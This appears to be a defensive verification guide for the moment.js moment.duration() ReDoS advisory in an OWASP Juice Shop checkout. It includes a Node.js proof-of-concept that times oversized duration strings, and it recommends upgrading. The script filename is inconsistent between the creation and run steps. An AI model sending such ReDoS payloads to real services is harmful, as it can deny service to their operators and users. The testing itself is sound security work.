
# GHSA‑87vv‑r9j6‑g5qv (moment.js moment.duration() ReDoS)

### Purpose

Minimal, reproducible steps an engineer can run from scratch to determine whether the current OWASP Juice Shop checkout is practically affected by GHSA‑87vv‑r9j6‑g5qv (CVE‑2016‑4055). Do tests in a disposable VM/container.

### Summary

Check vendored moment version and run a small local PoC that measures moment.duration() 



### Step-by-step (copy & paste)

**Clone the repo** :
git clone https://github.com/juice-shop/juice-shop.git && cd juice-shop

**Check vendored moment version** 
node -e "console.log(require('express-jwt/node_modules/moment').version)" 


#### Interpretation: If version < 2.11.2 (e.g. 2.0.0) the dependency is vulnerable in principle.

### Minimal function PoC (required)
**Create and run the simple stress test**:



**Create the directory**

mkdir -p part2_verification/logs

**Create the test script file (redo_test.js) inside the part2_verification**


**copy this content into the js file (redo_test.js)**


const moment = require('express-jwt/node_modules/moment');



function gen(len){ return '-' + '1'.repeat(len); }



function run(len){

  const s = gen(len);

  const start = process.hrtime.bigint();

  try { moment.duration(s); } catch(e) {}

  const end = process.hrtime.bigint();

  console.log(len, (Number(end - start) / 1e6).toFixed(3) + ' ms');

}



[20000, 50000, 100000, 200000, 500000, 1000000, 1500000, 1800000].forEach(run);

**Run the poc**:
node part2_verification/redos_test.js | tee part2_verification/logs/redos_output.txt

### Quick interpretation:

* If times reach seconds for modest sizes (20k–100k) → ReDo reproduced (exploitable).

* If times remain milliseconds even for large sizes (100k–1.8M) → no practical ReDoS observed on this host.


### Conclusion:
*   `moment` is vulnerable in dependency if version < 2.11.2.  
*   Practical exploitability:  **No exploit path demonstrated**.  
*   Recommended action: upgrade `moment` to ≥ 2.11.2 



### Final note

From the tests you ran (function PoC up to ~1.8M chars and wrapper run with no DETECT logs), the dependency is vulnerable in principle but we did not demonstrate a practical ReDoS exploit path in this Juice Shop checkout — still, upgrade to eliminate the risk.
